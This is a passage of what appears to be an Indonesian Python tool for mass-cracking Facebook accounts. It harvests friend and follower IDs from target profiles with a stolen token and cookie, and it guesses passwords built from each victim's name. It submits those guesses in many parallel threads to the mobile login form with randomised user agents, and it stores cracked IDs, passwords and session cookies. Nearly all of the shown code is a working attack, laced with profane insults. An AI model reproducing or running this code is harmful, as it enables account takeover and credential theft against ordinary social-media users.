	Consol.print(nel(table,width=79,title=f"{K2}MENU",style=f"dim")) 
	#cetak(nel(table,width=79,title=f"[bold green]MENU",style=f"#FFA300")) 

	RAF_MKZ=wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE : {K2}') 
	if RAF_MKZ in ['1','01']:
		raf_dump()
	elif RAF_MKZ in ['2','02']:
		dump_massal()
	elif RAF_MKZ in ['3','03']:
		crack_file()
	elif RAF_MKZ in ['4','04']:
		pengikut1()
	elif RAF_MKZ in ['5','05']:
		file_cp()
	elif RAF_MKZ in ['6','06']:
		result()
	elif RAF_MKZ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{m}Sukses Logout+Hapus Cookies{x}')
		exit()
	else:
		print(' ╰─  Pilih Yang Bener Asu ')
		back()
def error():
	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#-----------------[ CRACK NAMA ]-----------------#
def lainnya():
	cetak(nel(f"[bold green]1[bold white]. [bold green]CRACK USERNAME\n[bold green]2[bold white]. [bold yellow]EXIT", width=79, title=f"[bold green]CRACK NO LOGIN", style="bold hot_pink2")) 
	RAF_MKZ=wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE : {K2}') 
	if RAF_MKZ in ['1','01']:
		crack_nama()
	elif RAF_MKZ in ['2','02']:
		pengikut()
	else:
		print ('PILIH YANG BENER BANG')
		time.sleep(5)
		back()
		
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" ╰─  Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
		
def pengikut1():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = wa.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/v15.0/{akun}?fields=subscribers.limit(999999)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()


def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"[bold white]Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=79,padding=(0,2),style=f"bold hot_pink2"))
	nam = wa.input(f' ╰─  Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
	
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] Dump Dari Email, Max 1000 Id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r Sedang Dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	setting()	
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=100,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"{domris}"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def raf_dump():
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	cetak(nel(f'\t\t{P2}PASTIKAN ID BERSIFAT PUBLIK',width=79,style=f"dim")) 
	pil = wa.input(f'{CO}[{H2}•{CO}] {SE}PASTE YOUR ID : {K2}') 
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5001)&access_token='+tokenku[0],cookies = {'cookie':cok}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		#print('')
		cetak(nel(f'[magenta][[yellow]•[magenta]] [white]Total Idz Target Yang Terkumpul{P2} : {K2}'+str(len(id)),width=79, title=f'[bold green]TOTAL ID', style=f"dim")) 
		setting()
	except requests.exceptions.ConnectionError:
		print(' ╰─  Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' ╰─  Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(nel(f'\t\t{H2}>{K2}>{P2}> {P2}PASTIKAN ID BERSIFAT PUBLIK <{H2}<{K2}<{P2}',width=79,title=f'🛠🛠',style=f"dim")) 
		jum = int(wa.input(f'{CO}[{H2}•{CO}] {SE}MAU BERAPA TARGET? : {K2}')) 
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [{h}*{x}] Friendship Not Public  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = wa.input(f'{CO}[{H2}•{CO}] {SE}MASUKKAN IDZ YANG KE • ' +str(yz)+f': {K2}') 
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v15.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ╰─  Unstable Signal ')
			exit()
	try:
		cetak(nel(f'[purple][[yellow]•[purple]] [white]Total Idz Target Yang Terkumpul{P2} : {H2}'+str(len(id)),width=79, title=f'[bold green]TOTAL ID', style=f"#FFA300")) 
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' ╰─  Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' ╰─  {k} Friendship Not Public {x}')
		time.sleep(3)
		back()
		
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{h}[{P}>{h}] {x} %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	akunok=[]
	cepeh=[]
	table=Table(show_header=True, header_style='magenta') 
	table.add_column("NO",justify="center",width=11,style="magenta")
	table.add_column("MENU",justify="center",width=36,style="magenta")
	table.add_column("STATUS",justify="center",width=20,style="magenta")
	table.add_row(f"01", "[white]CRACK ID OLD", " NOT RECOMENDED") 
	table.add_row(f"02","[white]CRACK ID NEW","RECOMENDED")
	table.add_row(f"03","[whit]CRACK ID RANDOM","VERY RECOMENDED")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style=f"dim")) 
	hu = wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE : {K2}') 
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' ╰─  Pilih Yang Bener Kontooll ')
		exit()
	table=Table(show_header=True, header_style='magenta') 
	table.add_column("NO",justify="center",width=11,style="magenta")
	table.add_column("MENU CRACK ",justify="center",width=36,style="magenta")
	table.add_column("STATUS",justify="center",width=20,style="magenta")
	table.add_row("01","asycn m.fb","VERY RECOMENDED")
	table.add_row("02","asycn mbasic","recomended")
	table.add_row("03","reguler m.fb","recomended")
	table.add_row("04","validate m.fb","recomended")
	table.add_row("05","iphone.facebook","recomended")
	cetak(nel(table,width=79,title=f"[bold green]METODE LOGIN",style=f"dim")) 
	hc = wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE: {K2}') 
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('mobilev2')
	elif hc in ['5','05']:
		method.append('lawakv1')
	elif hc in ['6','06']:
	    method.append('lawakv2')
	else:
		method.append('mobile')
	cetak(panel(f'[bold white] APAKAH ANDA INGIN MENAMBAHKAN SANDI MANUAL? Y/T?? ', width=79, title=f'[bold green]TAMBAHAN SANDI', style=f"dim")) 
	pwplus=wa.input(f'{U2}[{H2}•{CO}] {SE}CHOICE : {K2}') 
	if pwplus in ['y', 'Y']:
		pwpluss.append('ya')
		cetak(panel('[white][[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] ', width=79, style=f"dim")) 
		pwku=input('>> Masukkan Password Tambahan : \x1b[1;93m ') 
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=79,title=f"[bold green]Setting User-Agent",style=f"dim")) 
	uatambah = input(f'{U}[{h}•{U}] {P}TAMBAHKAN USER AGENT(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['y','Ya','ya','Y']:
		uman.append('y')
		bzer = wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE : {K2}') 
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
	
	
from datetime import datetime    

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	sayang=[]
	sayang.append(panel(f'\t[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style=f"dim")) 
	sayang.append(panel(f'\t[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style=f"dim")) 
	wa.print(Columns(sayang))
	print(f'\n\t\t\t{P}ON/OF MODE PESAWAT SETIAP {M}200 {P}IDZ')
	awal = datetime.now()
	prog = Progress(SpinnerColumn("runner"),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
						#pwv.append(frs+'1')
						#pwv.append(frs+'2')
						#pwv.append(frs+'3')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append('mangkutana') 
						pwv.append('palopo') 
						pwv.append(frs+'cantik') 
						pwv.append(frs+'sayang') 
						pwv.append(frs+'pesek') 
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,awal)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,awal) 
				elif 'mobilev2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'lawakv1' in method:
					pool.submit(cracklawakv2,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,awal)
				elif 'lawakv2' in method:
					pool.submit(cracklawakv2,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
	
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = str(random.randint(1,12))
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'
	return ua
	
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('fr=%s;datr=%s;c_user=%s;xs=%s'%(cookie['fr'],cookie['datr'],cookie['c_user'],cookie['xs']))
	return(str(cok))

def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,awal):
	rescp=[]
	resok=[]
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r{SE}{idf} ⏰ [bold yellow]{ahir} ⏰ [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}[/]  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[/][white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=822564807908213&kid_directed_site=0&app_id=822564807908213&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1687406048139%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df29ffec2f374b%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df3a2f181fa9a828%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2d27df595696e%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%2526frame%253Dfe585a07da2204%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2d27df595696e%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ff18ff54dfb5fb68%26relation%3Dopener%26frame%3Dfe585a07da2204%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': True,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)
}
			headers = {
				'Host': 'm.facebook.com',
				'content-length': f'{len(str(data))}', 
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				'sec-ch-ua': '"Not.A/Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
				#'sec-ch-ua-mobile': '?1',
				'user-agent': ua,
				'content-type': 'application/x-www-form-urlencoded',
				#'sec-ch-ua-platform': '"Android"',
				'accept': '*/*',
				'origin': 'https://m.facebook.com',
				'x-requested-with': 'com.mi.globalbrowser.mini', 
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=822564807908213&kid_directed_site=0&app_id=822564807908213&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1687406048139%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df29ffec2f374b%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df3a2f181fa9a828%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2d27df595696e%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff18ff54dfb5fb68%2526relation%253Dopener%2526frame%253Dfe585a07da2204%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2d27df595696e%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ff18ff54dfb5fb68%26relation%3Dopener%26frame%3Dfe585a07da2204%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'en-US;q=0.8,en;q=0.7',
			}
